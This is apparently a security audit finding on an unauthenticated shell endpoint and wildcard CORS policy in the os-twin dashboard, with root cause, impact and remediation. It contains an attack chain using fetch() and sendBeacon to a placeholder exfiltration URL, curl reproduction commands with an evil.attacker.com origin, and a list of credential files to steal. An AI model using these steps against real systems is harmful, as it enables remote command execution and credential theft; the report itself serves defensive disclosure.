# C2 — Drive-by RCE via CORS Wildcard + Unauthenticated /api/shell

| Field            | Value                                                          |
|------------------|----------------------------------------------------------------|
| ID               | C2                                                             |
| Severity         | CRITICAL                                                       |
| CWE              | CWE-942 (Permissive CORS Policy), CWE-78 (OS Command Injection), CWE-306 (Missing Authentication) |
| CVSS v3.1 Base   | 9.6 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)                    |
| Affected Files   | `dashboard/api.py:108-113`, `dashboard/routes/system.py:166-169` |
| PoC-Status       | executed                                                       |
| Evidence         | `security/real-env-evidence/driveby-rce-cors/`                 |
| Commit           | 4c06f66                                                        |

---

## Description

The dashboard configures `CORSMiddleware` with `allow_origins=["*"]`,
`allow_methods=["*"]`, and `allow_headers=["*"]`:

```python
# dashboard/api.py:108-113
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)
```

Combined with the unauthenticated `POST /api/shell` endpoint (C1), any
malicious webpage can use the browser's `fetch()` API to send commands to the
victim's local dashboard and **read back the response**. The CORS wildcard is
the critical amplifier: without it, browsers would suppress the cross-origin
response even though the command would still execute server-side.

The attack requires **no interaction** beyond the victim loading the malicious
page — no clicks, no file downloads, no extensions.

---

## Attack Chain

```
Attacker hosts evil.html
       |
       | (phishing link / malicious ad / XSS on a third-party site)
       v
Victim's browser loads evil.html
       |
       | fetch("http://localhost:9000/api/shell?command=...", {method:"POST"})
       |   -- Browser sends CORS preflight OPTIONS
       v
Dashboard returns: access-control-allow-origin: *
       |
       | Browser sends POST, server executes command
       v
Dashboard returns command output with access-control-allow-origin: *
       |
       | JavaScript reads response body (allowed by wildcard)
       v
Attacker receives exfiltrated data via navigator.sendBeacon(EXFIL, data)
```

---

## Root Cause

Three defects are required simultaneously:

1. **CORS wildcard** (`dashboard/api.py:108-113`) — `allow_origins=["*"]`
   disables the browser's same-origin protection for all API responses.

2. **Missing authentication** (`dashboard/routes/system.py:166`) — `shell_command`
   has no `Depends(get_current_user)`. An authenticated endpoint would stop a
   cross-origin attacker who lacks a valid session cookie / token.

3. **`shell=True` with raw user input** — makes the command injection
   unrestricted once the prior two defects are exploited.

Defects 2 and 3 are shared with C1. C2 is the additional attack vector that
arises from defect 1.

---

## Impact

An attacker who convinces a victim to visit a malicious URL can:

- Execute arbitrary OS commands as the server process user on the victim's machine.
- Exfiltrate secrets (`~/.ostwin/.env`, `~/.aws/credentials`, `~/.ssh/id_rsa`).
- Establish persistent access (drop SSH authorized keys, cron job, etc.).
- The victim sees a blank or decoy page and has no indication an attack occurred.

This is weaponisable via phishing emails, malicious advertisements, typosquatted
domains, or XSS on any site the victim visits.

---

## Reproduction

**Prerequisites**: os-twin dashboard running on port 9000; victim's browser on
the same machine.

### Minimal single-payload test

```bash
# Confirm CORS preflight allows any origin
curl -s -X OPTIONS "http://localhost:9000/api/shell?command=id" \
  -H "Origin: http://evil.attacker.com" \
  -H "Access-Control-Request-Method: POST" -D - -o /dev/null

# Confirm cross-origin POST executes and response is readable
curl -s -X POST "http://localhost:9000/api/shell?command=whoami" \
  -H "Origin: http://evil.attacker.com" -D -
```

### Drive-by HTML page

Serve `security/findings/C2-driveby-rce-cors/poc.html` from any web server,
replace `EXFIL` with an attacker-controlled URL, and open it in a browser on
the target machine. The page will execute `id`, `hostname`, and
`cat ~/.ostwin/.env` silently on page load and beacon the results.

Live evidence at `security/real-env-evidence/driveby-rce-cors/reproduction.md`
confirms all three reproduction tests passed.

---

## Code References

| File | Line(s) | Note |
|------|---------|------|
| `dashboard/api.py` | 108-113 | `CORSMiddleware(allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])` |
| `dashboard/routes/system.py` | 166-169 | Unauthenticated `/api/shell` with `subprocess.run(shell=True)` |
| `dashboard/api.py` | 215 | Default bind `0.0.0.0` — network-wide exposure |

---

## Remediation

**Primary fix — Fix C1 first.** Removing the unauthenticated `/api/shell`
endpoint (or adding `Depends(get_current_user)`) breaks the attack chain at the
most critical point regardless of CORS policy.

**Secondary fix — Restrict CORS.**

Replace the wildcard with an explicit allowlist of trusted origins:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000"],   # frontend origin only
    allow_methods=["GET", "POST"],
    allow_headers=["Authorization", "Content-Type"],
    allow_credentials=False,
)
```

`allow_origins=["*"]` is never appropriate for an API that executes privileged
operations. Even for read-only APIs it discloses internal data to any webpage.

**Defence-in-depth.**

- Bind to `127.0.0.1` so the API is not reachable from the network at all.
- Add a `SameSite=Strict` or `SameSite=Lax` session cookie so cross-origin
  requests cannot carry authenticated sessions.
- Implement CSRF token validation for state-mutating endpoints.

---

## Adversarial Review

`security/adversarial-reviews/driveby-rce-cors-review.md`

> Adversarial-Verdict: CONFIRMED
> Severity-Final: CRITICAL
> Three tests confirmed: direct POST, CORS preflight, and cross-origin POST with
> `Origin: http://evil.attacker.com` — all succeeded, response readable by JS.
